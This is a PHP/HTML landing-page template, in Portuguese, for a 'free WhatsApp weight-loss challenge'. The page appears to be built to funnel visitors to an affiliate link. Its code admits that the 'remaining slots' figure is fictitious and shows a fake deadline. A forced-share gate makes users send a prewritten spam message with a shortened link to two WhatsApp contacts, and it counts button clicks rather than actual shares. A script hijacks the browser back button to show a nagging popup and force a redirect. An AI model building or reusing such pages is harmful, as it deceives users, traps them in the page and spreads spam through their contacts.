<?php

/*bote o título entre aspas simples ' '*/
$titulo = 'Desafio Grátis no WhatsApp para Emagrecer ';

/*informe o link de destino depois do usuário compartilhar*/
$link = 'https://pontododinheiro.com/lg/100k-gps-ls/';

/*informe o link aonde este script ficará*/
$link_viral = 'http://bit.ly/euqrosim_';

/*informe o link da imagem que irá aparecer*/
$imagem = 'https://dietade17dias.com/quiz/dietade17dias.jpg';

/*informe o número de vezes que o usuário precisa compartilhar para acessar o link*/
$shares = 2;

/*informe o número de vagas (fictício)*/
$vagas = 10;

/*informe o texto que irá aparecer no whatsapp %0A = pular uma linha, *texto em negrito* */
$desc_whatsapp = 

'*Desafio Grátis no WhatsApp para Emagrecer* %0A%0ARestam poucas vagas! %0A%0A*COMO FUNCIONA:* Participe comigo e receba dicas, cardápio, receitinhas e instruções diárias no seu WhatsApp! Eu vou te ensinar todo o passo a passo para conseguir emagrecer e perder peso de verdade, de forma saudável e rápida!';

/*não altere a não ser que saiba o que está fazendo*/
$desc_whatsapp .= '%0A%0A*REALIZE A SUA INSCRIÇÃO GRÁTIS:*%0A'.$link_viral.' %0A%0AClique no link acima para enviar uma mensagem no WhatsApp da nutri Karina e participar *O PRAZO PARA INSCRIÇÃO TERMINA AMANHÃ ÀS 18h*';

/*Daqui para baixo, não altere nada!*/

?>
<!DOCTYPE html>
<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<center>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta content="width=device-width, initial-scale=1.0" name="viewport">
<meta property="og:title" content="<?php echo $titulo; ?> | Cine Vagas">
<meta property="og:image" content="<?php echo $imagem; ?>">
<meta property="og:description" content="<?php echo $titulo; ?>">
<meta property="og:url" content="<?php echo $link_viral; ?>">
<link rel="canonical" href="<?php echo $link_viral; ?>">
<title><?php echo $titulo; ?> | Cine Vagas</title>
<style>

/* html5doctor.com Reset v1.6.1 - http://cssreset.com */
html,body,div,span,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,abbr,address,cite,code,del,dfn,em,img,ins,kbd,q,samp,small,strong,sub,sup,var,b,i,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,figcaption,figure,footer,header,hgroup,menu,nav,section,summary,time,mark,audio,video{margin:0;padding:0;border:0;outline:0;font-size:100%;vertical-align:baseline;background:transparent}body{line-height:1}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}nav ul{list-style:none}blockquote,q{quotes:none}blockquote:before,blockquote:after,q:before,q:after{content:none}a{margin:0;padding:0;font-size:100%;vertical-align:baseline;background:transparent}ins{background-color:#ff9;color:#000;text-decoration:none}mark{background-color:#ff9;color:#000;font-style:italic;font-weight:bold}del{text-decoration:line-through}abbr[title],dfn[title]{border-bottom:1px dotted;cursor:help}table{border-collapse:collapse;border-spacing:0}hr{display:block;height:1px;border:0;border-top:1px solid #ccc;margin:1em 0;padding:0}input,select{vertical-align:middle}
/* latin-ext */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 300;
  src: local('Lato Light'), local('Lato-Light'), url(https://fonts.gstatic.com/s/lato/v14/dPJ5r9gl3kK6ijoeP1IRsvY6323mHUZFJMgTvxaG2iE.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 300;
  src: local('Lato Light'), local('Lato-Light'), url(https://fonts.gstatic.com/s/lato/v14/EsvMC5un3kjyUhB9ZEPPwg.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2212, U+2215;
}
/* latin-ext */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 400;
  src: local('Lato Regular'), local('Lato-Regular'), url(https://fonts.gstatic.com/s/lato/v14/UyBMtLsHKBKXelqf4x7VRQ.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 400;
  src: local('Lato Regular'), local('Lato-Regular'), url(https://fonts.gstatic.com/s/lato/v14/1YwB1sO8YE1Lyjf12WNiUA.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2212, U+2215;
}
/* latin-ext */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 700;
  src: local('Lato Bold'), local('Lato-Bold'), url(https://fonts.gstatic.com/s/lato/v14/ObQr5XYcoH0WBoUxiaYK3_Y6323mHUZFJMgTvxaG2iE.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 700;
  src: local('Lato Bold'), local('Lato-Bold'), url(https://fonts.gstatic.com/s/lato/v14/H2DMvhDLycM56KNuAtbJYA.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2212, U+2215;
}
/* latin-ext */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 900;
  src: local('Lato Black'), local('Lato-Black'), url(https://fonts.gstatic.com/s/lato/v14/R4a6fty3waPci7C44H8AjvY6323mHUZFJMgTvxaG2iE.woff2) format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Lato';
  font-style: normal;
  font-weight: 900;
  src: local('Lato Black'), local('Lato-Black'), url(https://fonts.gstatic.com/s/lato/v14/tI4j516nok_GrVf4dhunkg.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2212, U+2215;
}

body {
background: #E6E8FA;
}

.progress {
      display: none;
      width:80%;
      height: 20px;  /* Can be anything */
      position: relative;
      margin: 60px 0 20px 0; /* Just for demo spacing */
      background: #555;
      -moz-border-radius: 25px;
      -webkit-border-radius: 25px;
      border-radius: 25px;
      padding: 10px;
      -webkit-box-shadow: inset 0 -1px 1px rgba(255,255,255,0.3);
      -moz-box-shadow   : inset 0 -1px 1px rgba(255,255,255,0.3);
      box-shadow        : inset 0 -1px 1px rgba(255,255,255,0.3);
      margin: auto;
    }
	
			.h7 {text-shadow: 0.05em 0.05em 0.05em #282828}
    .progress > span {
      display: block;
      height: 100%;
      -webkit-border-top-right-radius: 8px;
      -webkit-border-bottom-right-radius: 8px;
      -moz-border-radius-topright: 8px;
      -moz-border-radius-bottomright: 8px;
      border-top-right-radius: 8px;
      border-bottom-right-radius: 8px;
      -webkit-border-top-left-radius: 20px;
      -webkit-border-bottom-left-radius: 20px;
      -moz-border-radius-topleft: 20px;
      -moz-border-radius-bottomleft: 20px;
      border-top-left-radius: 20px;
      border-bottom-left-radius: 20px;
      background-color: #3F51B5;
      background-image: -webkit-gradient(         linear,         left bottom,         left top,         color-stop(0, #00BCD4),         color-stop(1, #2196F3)        );
      background-image: -moz-linear-gradient(
        center bottom,
        rgb(43,194,83) 37%,
        rgb(84,240,84) 69%
       );
      -webkit-box-shadow: 
        inset 0 2px 9px  rgba(255,255,255,0.3),
        inset 0 -2px 6px rgba(0,0,0,0.4);
      -moz-box-shadow: 
        inset 0 2px 9px  rgba(255,255,255,0.3),
        inset 0 -2px 6px rgba(0,0,0,0.4);
      box-shadow: 
        inset 0 2px 9px  rgba(255,255,255,0.3),
        inset 0 -2px 6px rgba(0,0,0,0.4);
      position: relative;
      overflow: hidden;
    }
    .progress > span:after, .animate > span > span {
      content: "";
      position: absolute;
      top: 0; left: 0; bottom: 0; right: 0;
      background-image: 
         -webkit-gradient(linear, 0 0, 100% 100%, 
            color-stop(.25, rgba(255, 255, 255, .2)), 
            color-stop(.25, transparent), color-stop(.5, transparent), 
            color-stop(.5, rgba(255, 255, 255, .2)), 
            color-stop(.75, rgba(255, 255, 255, .2)), 
            color-stop(.75, transparent), to(transparent)
         );
      background-image: 
        -moz-linear-gradient(
          -45deg, 
            rgba(255, 255, 255, .2) 25%, 
            transparent 25%, 
            transparent 50%, 
            rgba(255, 255, 255, .2) 50%, 
            rgba(255, 255, 255, .2) 75%, 
            transparent 75%, 
            transparent
         );
      z-index: 1;
      -webkit-background-size: 50px 50px;
      -moz-background-size: 50px 50px;
      -webkit-animation: move 2s linear infinite;
         -webkit-border-top-right-radius: 8px;
      -webkit-border-bottom-right-radius: 8px;
             -moz-border-radius-topright: 8px;
          -moz-border-radius-bottomright: 8px;
                 border-top-right-radius: 8px;
              border-bottom-right-radius: 8px;
          -webkit-border-top-left-radius: 20px;
       -webkit-border-bottom-left-radius: 20px;
              -moz-border-radius-topleft: 20px;
           -moz-border-radius-bottomleft: 20px;
                  border-top-left-radius: 20px;
               border-bottom-left-radius: 20px;
      overflow: hidden;
    }
    
    .animate > span:after {
      display: none;
    }
	
	.recharge-leftt {
    width: 320px;
    background: #004266;
    border: 0px solid #ffffff;
    padding: 15px 10px;
}

	.rechargee-leftt {
    width: 320px;
    background: #a90000;
    border: 1px solid #f14033;
    padding: 15px 10px;
}

.btn-primary {
    color: #fff;
    background-color: #e2001b;
    border-color: #23238E;
}

.btn {
    display: inline-block;
    font-weight: 400;
    line-height: 1.25;
    text-align: center;
    white-space: nowrap;
    vertical-align: middle;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    border: 1px solid transparent;
    padding: .5rem 1rem;
    font-size: 1rem;
    border-radius: .25rem;
    -webkit-transition: all .2s ease-in-out;
    -o-transition: all .2s ease-in-out;
    transition: all .2s ease-in-out;
}
    
    @-webkit-keyframes move {
        0% {
           background-position: 0 0;
        }
        100% {
           background-position: 50px 50px;
        }
    }

#commentsya *{margin:3px 0;}#commentsya{font-family:tahoma,verdana,arial,sans-serif;background-color:#F7F7F7;width:100%;margin-top:20px;margin-bottom:0;}.clearfix::after,.clearfix::before{content:"";display:table}.clearfix::after{clear:both}.cmnts{padding:0 5px;font-family:Tahoma,Verdana,sans-serif;background-color:#fff;font-size:12px;text-align:left;margin:0;}.comments{font-weight:700;text-align:center;padding:0 5px 10px}.cmnts .buttons{padding-top:10px;}.new-likes{margin-top:3px;background-color:#eeeff4;padding:5px 5px 5px 23px;background-image:url(http://i.imgur.com/s0PvMI1.png);background-size:12px 12px;background-repeat:no-repeat;background-position:5px center}.color-blue{color:#3c5a96}.buttons{margin-top:14px;padding:5px;font-family:Arial,sans-serif;color:#7d7d7f}.buttons span{cursor:pointer}.buttons span:hover{text-decoration:underline}.more{margin-top:3px;background-color:#eeeff4;padding:5px 5px 5px 23px;background-image:url(http://i.imgur.com/wzpS6xK.png);background-size:13px 12px;background-position:5px center;background-repeat:no-repeat}.left{cursor:pointer;}.left:hover{text-decoration:underline}.right{color:#7d7d7f;float:right}.item{position:relative;margin-top:3px;background-color:#eeeff4;padding:5px 5px 5px 60px;min-height:60px;box-sizing:border-box}.item .profileimg{position:absolute;top:5px;left:5px}.comtxt{line-height:16px}.name{color:#3c5a96;font-weight:700}.ago{color:#86878c;font-size:.95em}.new-like{color:#3c5a96;font-size:.95em;cursor:pointer}.new-like:hover{text-decoration:underline}.combot{padding-top:5px}.likes{color:#3c5a96;font-size:.95em;cursor:pointer}.comments,.hidden .combot,.hidden .comtxt{display:none}.hidden{display:none;opacity:0;}

html {
  box-sizing: border-box;
}
*, *:before, *:after {
  box-sizing: inherit;
}

body {
	font-family: 'Lato', sans-serif;
	background: #201e39;
	border: 0;
	padding: 0;
	margin: 0;
	min-height: 100%;
}

a {
	display: inline-grid;
    font-size: 40px;
	width: 43%;
	padding: 10px 0;
	margin: 0 10px;
	color: #09081e;
	text-decoration: none;
	border-radius: 5px;
	text-transform: uppercase;
}

a img {
	border: 0;
}

.wrap {
	margin: 0 auto;
	text-align: center;
}

.clear-fix {
	clear: both;
}

.show {
	display: block;
}

.hide {
	display: none;
}

/* Font and Headline settings */

h1 {
	font-size: 40px;
	font-weight: 700;
	text-transform: uppercase;
	color: #ff6b6b;
	margin-bottom: 25px;
}

h2 {
	font-size: 30px;
	font-weight: 900;
	text-transform: uppercase;
	color: #fff;
	margin-bottom: 25px;
}

#headline h2 {
	color: #484662;
	font-size: 30px;
}

h3 {
	font-size: 25px;
	font-weight: 300;
	color: #484662;
}

h3 span {
	font-weight: 400;
}

h4 {
	font-size: 16px;
	font-weight: 900;
	text-transform: uppercase;
	color: #484662;
	margin-bottom: 5px;
}

h5 {
	font-size: 40px;
	font-weight: 300;
	text-transform: uppercase;
	line-height: 90px;
}

h6 {
	font-size: 30px;
	font-weight: 400;
	color: #fff;
}
    
h7 {
	font-size: 15px;
	font-weight: 400;
	color: #fff;
}    

p {
	font-size: 12px;
	font-weight: 400;
	color: #000;
}

/* Header / TOP AREA */

header {
	width: 100%;
	min-height: 100px;
	padding: 25px 0;
	background: #E6E8FA;
	margin: 0;
}

#main_pic {
	width: 460px;
	margin: 0 auto;
	border-radius: 15px;
}

#main_pic p {
	text-indent: -9999;
}

#warning {
	width: 150px;
	padding: 5px;
	border-radius: 10px;
	background: rgba(255, 255, 255, .7);
	margin-left: 5px;
	margin-top: 168px;
}

#headline {
	width: 68%;
	margin: 0 auto;
	padding-top: 25px;
}

/* End of Header / TOP AREA */

section {
	width: 100%;
	padding: 35px 0;
}

ul {
	list-style-type: none;
	margin-bottom: 25px;
}

ul li {
	display: inline-block;
	width: 90px;
	height: 90px;
	margin: 10px;
	color: #fff;
	border: 2px solid #fff;
	border-radius: 5px;
	-webkit-transition: all 0.75s ease-in-out;
	-moz-transition: all 0.75s ease-in-out;
	-ms-transition: all 0.75s ease-in-out;
	-o-transition: all 0.75s ease-in-out;
}

.active {
	background: #c7f464;
	color: #09081e;
	border: 2px solid #c7f464;
	-webkit-transition: all 0.75s ease-in-out;
	-moz-transition: all 0.75s ease-in-out;
	-ms-transition: all 0.75s ease-in-out;
	-o-transition: all 0.75s ease-in-out;
}

#yes, .button1:nth-child(2), .button2:nth-child(2), #start  {
	background: #c7f464;
}

#yes:hover, .button1:nth-child(2):hover, .button2:nth-child(2):hover, #start:hover {
	background: #daf4a2;
}

#continue{ background: #ff6b6b; margin-top: 10px;}
#continue:hover{ background: #ff6b6b;}

#no, .button1:nth-child(3), .button2:nth-child(3) {
	background: #ff6b6b;
}

#no:hover, .button1:nth-child(3):hover, .button2:nth-child(3):hover {
	background: #fcaaaa;
}

#preload {
	margin: 0 auto;
}

#q4 h3 {
	font-size: 14px;
	line-height: 18px;
	color: #fff;
	margin-bottom: 25px;
}

#reject h1 {
	color: #c7f464;
}

footer {
	position: fixed;
	bottom: 0;
	padding: 10px 0;
	width: 100%;
	font-size: 12px;
	color: #fff;
	text-align: center;
}

footer p {
	color: #fff;
}

@media only screen and (min-width: 960px) {

.wrap { 
	width: 960px;
	}
}

@media screen and (max-width : 959px) {

.wrap { 
	width: 100% !important;
	padding: 0 10px;
	}

footer p {
	color: #fff;
	}
}

@media screen and (max-width : 700px) {

#headline {
	width: 80%;
	}

a {
	width: 42%;
	font-size: 30px;
	margin: 0 3%;
	}

h1 {
	font-size: 30px;
	margin-bottom: 15px;
	}

h2, h6 {
	font-size: 24px;
	margin-bottom: 15px;
	}

h3 {
	font-size: 21px;
	}

h4 {
	font-size: 14px;
	margin-bottom: 0;
	}

h5 {
	font-size: 30px;
	line-height: 70px;
	}

#headline {
	padding-top: 15px;
	}

ul {
	margin-bottom: 15px;
	}

ul li {
	width: 70px;
	height: 70px;
	}
}

@media screen and (max-width : 520px) {

#preload img {
	width: 90%;
	}
}

@media screen and (max-width : 480px) {

header, section {
	padding: 15px 0;
}

#main_pic {
	width: 50%;
	}

#headline {
	width: 90%;
	padding-top: 10px;
	}

h1 {
	font-size: 21px;
	margin-bottom: 15px;
	}

h2, h6 {
	font-size: 16px;
	margin-bottom: 10px;
	}

#headline h2{
	font-size: 14px;
	}

h3 {
	font-size: 16px;
	}

h4 {
	font-size: 12px;
	margin-bottom: 0;
	}

ul {
	margin-bottom: 10px;
	}

#start, #continue {
	width: 80%;
	font-size: 22px;
    font-weight: bold;
	}
}

@media screen and (max-width : 320px) {

header, section {
	padding: 10px 0;
}

#headline {
	width: 100%;
	padding-top: 5px;
	}

a {
	font-size: 21px;
	padding: 10px 0;
	}

h1 {
	font-size: 18px;
	margin-bottom: 15px;
	}

h2, h6 {
	font-size: 14px;
	margin-bottom: 10px;
	}

#headline h2{
	font-size: 12px;
	margin-bottom: 5px;
	}

h3 {
	font-size: 14px;
	}

h4 {
	font-size: 10px;
	margin-bottom: 0;
	}

h5 {
	font-size: 21px;
	line-height: 50px;
	}

ul {
	margin-bottom: 10px;
	}

#start, #continue {
	width: 80%;
	}

ul li {
	width: 50px;
	height: 50px;
	margin: 5px;
	}

#q4 h3 {
	font-size: 12px;
	}
}
.progress {      width:80%;      height: 20px;  /* Can be anything */      position: relative;      margin: 60px 0 20px 0; /* Just for demo spacing */      background: #555;      padding: 10px;      -webkit-box-shadow: inset 0 -1px 1px rgba(255,255,255,0.3);      -moz-box-shadow   : inset 0 -1px 1px rgba(255,255,255,0.3);      box-shadow        : inset 0 -1px 1px rgba(255,255,255,0.3);      margin: auto;    }    .progress > span {      display: block;      height: 20px;	  left: 0;	  top: 0;      background-color: #3F51B5;      background-image: -webkit-gradient(         linear,         left bottom,         left top,         color-stop(0, #00BCD4),         color-stop(1, #2196F3)        );      background-image: -moz-linear-gradient(        center bottom,        rgb(43,194,83) 37%,        rgb(84,240,84) 69%       );      -webkit-box-shadow:         inset 0 2px 9px  rgba(255,255,255,0.3),        inset 0 -2px 6px rgba(0,0,0,0.4);      -moz-box-shadow:         inset 0 2px 9px  rgba(255,255,255,0.3),        inset 0 -2px 6px rgba(0,0,0,0.4);      box-shadow:         inset 0 2px 9px  rgba(255,255,255,0.3),        inset 0 -2px 6px rgba(0,0,0,0.4);      position: absolute;      overflow: hidden;    }    .progress > span:after, .animate > span > span {      content: "";      position: absolute;      top: 0; left: 0; bottom: 0; right: 0;      background-image:          -webkit-gradient(linear, 0 0, 100% 100%,             color-stop(.25, rgba(255, 255, 255, .2)),             color-stop(.25, transparent), color-stop(.5, transparent),             color-stop(.5, rgba(255, 255, 255, .2)),             color-stop(.75, rgba(255, 255, 255, .2)),             color-stop(.75, transparent), to(transparent)         );      background-image:         -moz-linear-gradient(          -45deg,             rgba(255, 255, 255, .2) 25%,             transparent 25%,             transparent 50%,             rgba(255, 255, 255, .2) 50%,             rgba(255, 255, 255, .2) 75%,             transparent 75%,             transparent         );      z-index: 1;      -webkit-background-size: 50px 50px;      -moz-background-size: 50px 50px;      -webkit-animation: move 2s linear infinite;         -webkit-border-top-right-radius: 8px;      -webkit-border-bottom-right-radius: 8px;             -moz-border-radius-topright: 8px;          -moz-border-radius-bottomright: 8px;                 border-top-right-radius: 8px;              border-bottom-right-radius: 8px;          -webkit-border-top-left-radius: 20px;       -webkit-border-bottom-left-radius: 20px;              -moz-border-radius-topleft: 20px;           -moz-border-radius-bottomleft: 20px;                  border-top-left-radius: 20px;               border-bottom-left-radius: 20px;      overflow: hidden;    }        .animate > span:after {      display: none;    }        @-webkit-keyframes move {        0% {           background-position: 0 0;        }        100% {           background-position: 50px 50px;        }    }
/* COMMENTS */
.fbcoms {
font-family: Tahoma, Verdana, sans-serif;
/*background-color: #fff;*/
width: 100%;
margin: 0 auto;
padding: 5px 10px;
font-size: 12px;
text-align: left;
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
box-sizing: border-box;
}
.comments {
font-weight: bold;
text-align: center;
padding: 0 5px 10px 5px;
}
.totlikes {
margin-top: 3px;
background-color: #eeeff4;
padding: 5px 5px 5px 23px;
background-image: url("../img/f/like.png");
background-repeat: no-repeat;
background-position: 5px center;
}
.fbblue {
color: #3c5a96;
}
.buttons {
padding-bottom: 0px;
font-family: Arial, sans-serif;
color: #7d7d7f;
}
.buttons span {
cursor: pointer;
}
.buttons span:hover {
text-decoration: underline;
}
.viewmore {
margin-top: 3px;
background-color: #eeeff4;
padding: 5px 5px 5px 23px;
background-image: url("../img/f/bubble.png");
background-position: 5px center;
background-repeat: no-repeat;
}
.left {
cursor: pointer;
float: left;
color: #3c5a96;
}
.left:hover {
text-decoration: underline;
}
.right {
color: #7d7d7f;
float: right;
}
.item {
position: relative;
margin-top: 3px;
background-color: #eeeff4;
padding: 5px 5px 5px 60px;
min-height: 60px;
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
box-sizing: border-box;
}
.item .profileimg {
position: absolute;
top: 5px;
left: 5px;
}
.comtxt {
line-height: 16px;
}
.name {
color: #3c5a96;
font-weight: bold;
}
.ago {
color: #86878c;
font-size: 0.95em;
}
.fblike {
color: #3c5a96;
font-size: 0.95em;
cursor: pointer;
}
.fblike:hover {
text-decoration: underline;
}
.combot {
padding-top: 5px;
}
.clickhere {
font-weight: bold;
padding: 30px 10px 5px;
line-height: 18px;
}
.likes {
color: #3c5a96;
font-size: 0.95em;
cursor: pointer;
}
.fbimg {
background-color: #fff;
border-radius: 2px;
-moz-border-radius: 2px;
-webkit-border-radius: 2px;
max-width: 210px;
width: 100%;
padding: 3px;
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
box-sizing: border-box;
border: 1px solid #808080;
margin: 10px 0 5px;
}
.hidden {
display: none;
opacity: 0;
}
.hidden .comtxt, .hidden .combot, .comments {
display: none;
}
.answer{
cursor: pointer;
}

#main-frame-error{display:none;height:auto}.interstitial-wrapper{padding-top:10px;box-sizing:border-box;font-size:1em;line-height:18px;margin:auto;max-width:600px;width:90%}#today{float:right;font-weight:600;padding-top:15px}#main-message>p{display:inline}#blink{color:#f00;padding:6px;-webkit-animation:blink 1s infinite;-moz-animation:blink 1s infinite;-ms-animation:blink 1s infinite;-o-animation:blink 1s infinite;animation:blink 1s infinite}@-webkit-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-moz-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-ms-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}}@-o-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}#theTime{font-size:18px;font-weight:bold;color:red;font-family:sans-serif}h1{color:#000;font-size:1.6em;line-height:1.25em;margin-bottom:16px}#alertimg{height:26px;width:26px;position:absolute;top:13px;left:17px}.popup{display:none;position:absolute;top:20%;left:50%;width:88%;max-width:280px;margin:0 0 0 -140px;font-size:1em;border-radius:4px;background-color:#282828;color:#fff;overflow:hidden;box-shadow:1px 1px 7px #000;z-index:100}.popup-head{background-color:#282828;padding:18px 16px 18px 55px;border-bottom:2px solid #33b4e4;color:#33b4e4;line-height:normal}.popup-center{padding:20px 16px;color:#f3f3f3;line-height:20px}.popup-bottom{background-color:#282828;padding:9px 6px;text-align:center;border-top:1px solid #474747;overflow:hidden}.popup-bottom .button{display:block;height:30px;width:128px;margin:0 auto;font-size:1.1em;color:#f3f3f3;border-radius:3px;cursor:pointer;text-decoration:none;padding:0;line-height:30px}


</style>



    <script type='text/javascript'>
      //<![CDATA[
      var ii = 0; // needed for safari
      var iy = 0;
      if (typeof history.pushState === "function") {
        history.pushState("back", null, null);
        window.onpopstate = function() {
          history.pushState('back', null, null);
          if (iy==3) {
            iy=0;
            window.location.href='<?php echo $link; ?>';
          } else if (ii == 1) {
            document.getElementById('popup1').style.display = "none";
            setTimeout(function() {
              if (document.getElementById('popup1').style.display == "none") {
                document.getElementById('popup1').style.display = "block";
              }
            }, 300);
            window.navigator.vibrate(000);
            iy=iy+1;
          }
        };
      }
      setTimeout(function() {
        ii = 1;
      }, 200);
      function hidepop() {
        document.getElementById('popup1').style.display = "none";
      }
      //]]>
    </script>
    
   
</head>


    
    <div class='popup fourth' id='popup1' style='display:none'>
      <div class='popup-head'>
        <img alt='' height='26' id='alertimg' src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaAQMAAACThN6NAAAABlBMVEUAAAC5ubnoUmKJAAAAAXRSTlMAQObYZgAAAEVJREFUCNdjQAI8cEIOTtiDiPoGGPH5AIh4wMDA+PkDAwMzhPjBwMAOIvg//4ES8v//AbV+/g8l6v//b4AQ////P8CACgCNvyHz1VKxBQAAAABJRU5ErkJggg==' width='26'/>
        Aviso do Site!      
      </div>
      <div class='popup-center'>
         CADASTRO INCOMPLETO!
        <br/>
        <br/>
        Siga as instruções para conseguir sua vaga!                  
        <br/>
        <br/>        
      </div>
      <div class='popup-bottom'>
        <div class='button' onclick='hidepop();'>
          OK
        </div>
      </div>
    </div>


    <header class="header">
        <center>

<br/>
		
	<img src="<?php echo $imagem; ?>" width="310px">
	





                <div id="headline">
			
                    <h2 class="subtitle">RESTAM <font color=red><?php echo $vagas; ?></font> VAGAS NO DESAFIO PARA EMAGRECER!<br/><br/>
RESPONDA AS PERGUNTAS A SEGUIR PARA CONFIRMAR A SUA VAGA NO NOSSO DESAFIO GRÁTIS NO WHATSAPP!</h2>

                    </div>
                    <div id="remover">

                    <div id="subheadline">
                    <h3 class="othertitle"></h3>
                        </div></div></center></header></head></html>
            
            <div class="clear-fix"></div>
    

    <section>
        <div class="wrap" id="questions">
            <div id="numbers">
                <h2>Pergunta:</h2>
                <ul>
                    <li id="one" class="active">
                        <h5>1</h5>
                    </li>
                    <li id="two">
                        <h5>2</h5>
                    </li>
                    <li id="three">
                        <h5>3</h5>
                    </li>
                </ul>
            </div>

            <div id="q1">
                <h2 class="q1">VOCÊ TEM VONTADE DE EMAGRECER?</h2>
                <a href="javascript:void(0)" id="yes">Sim</a>
                <a href="javascript:void(0)" id="no">Não</a>
                <div class="clear-fix"></div>
            </div>
            <div id="q2" class="hide">
                <h2 class="q2">VOCÊ GOSTÁRIA DE RECEBER DICAS, RECEITAS E INSTRUÇÕES PARA EMAGRECER NO SEU WHATSAPP?</h2>
                <a href="javascript:void(0)" class="button1">Sim</a>
                <a href="javascript:void(0)" class="button1">Não</a>
                <div class="clear-fix"></div>
            </div>
            <div id="q3" class="hide">
                <h2 class="q3">ESTÁ REALMENTE DISPOSTO(A) A PARTICIPAR DA DIETA?</h2>
                <a href="javascript:void(0)" class="button2">Sim</a>
                <a href="javascript:void(0)" class="button2">Nao</a>
                <div class="clear-fix"></div>
            </div>
            <div id="preload" class="hide">
                <img src="files/validator.gif" alt="">
                <h6>Verificando...</h6>
            </div>
			

<script type="text/javascript">

	var STRONG = {
		share: <?php echo $shares; ?>
	};

	function shared(p){		
		ga('send', 'event', 'Youtube', 'Share ' + p, 'Converted');
	}
      
	  function incrementValue()
      {
        var value = parseInt(document.getElementById('number').value, 10);
        value = isNaN(value) ? 0 : value;
        value++;
        shared(value);
        document.getElementById('number').value = value;
		
        var value = parseInt(document.getElementById('number').value, 10);
        if(value>= STRONG.share){
          window.location="<?php echo $link; ?>";
        }else{

        }
		
		
      }
	  
function fn1() {
	STRONG.count = true;
	var value = parseInt(document.getElementById('number').value, 10);
	value = value + 1;	
	document.querySelector('.progress').style.display = "block";
	var inicio = 100;
	var divisor = STRONG.share;
	var porsiento = inicio / divisor;
	var estatico = porsiento;
	var obtenido = parseInt(estatico * value);
	document.querySelector('.progress span').style['width'] = obtenido + "%";
	document.querySelector('.progress span').style['width'] = obtenido + "%";

}
</script>


<script type="text/javascript">
function setCookie1(e,t,n)
{
var i=new Date;
i.setTime(i.getTime()+24*n*60*60*1e3)
;var o="expires="+i.toUTCString();
document.cookie=e+"="+t+"; "+o
}

function getCookie1(e)
{for(var t=e+"=",n=document.cookie.split(";"),i=0;i<n.length;i++){for(var o=n[i];" "==o.charAt(0);)o=o.substring(1);if(0==o.indexOf(t))return o.substring(t.length,o.length)}return 0}
</script>
            

            <div id="q4" class="hide"><h2>PARABÉNS, FALTA SÓ UMA COISINHA PARA CONFIRMAR A SUA VAGA!</h2><h7 id="subdesc1" class="show">Para que possamos preencher todas as vagas o mais rápido possível e ajudar o maior número de pessoas possíveis que precisam emagrecer, pedimos a sua ajuda, precisamos que você <br>Compartilhe essa oportunidade com <?php echo $shares; ?> de seus amigos e/ou grupos no WhatsApp!<br/><br/>Após compartilhar você será redirecionado para a página com informações sobre o desafio, onde irá começar a receber as dicas, receitinhas e instruções da dieta.<br/><br/>Clique no botão abaixo e compartilhe com <?php echo $shares; ?> amigas no WhatsApp que vão amar participar desse desafio para emagrecer e perder peso de forma saudável e rápida com você!</h7><div id="subdesc2" class="block__body hide" style="background:#201e39;padding-bottom: 15px;border: 0;color: #FFF;">Acesso liberado, clique em <br><span style="color:#000;background-color:#9de1fe">CONTINUAR.</span><br> adicione seus dados e aproveite</div><br><br>
			
	<a href="https://api.whatsapp.com/send?text=<?php echo $desc_whatsapp; ?>"target="_blank" onclick="incrementValue()" id="start">
        <button onclick="fn1()" style="border:none;background:transparent;font-size:20px;">CLIQUE AQUI PARA COMPARTILHAR</button></a>


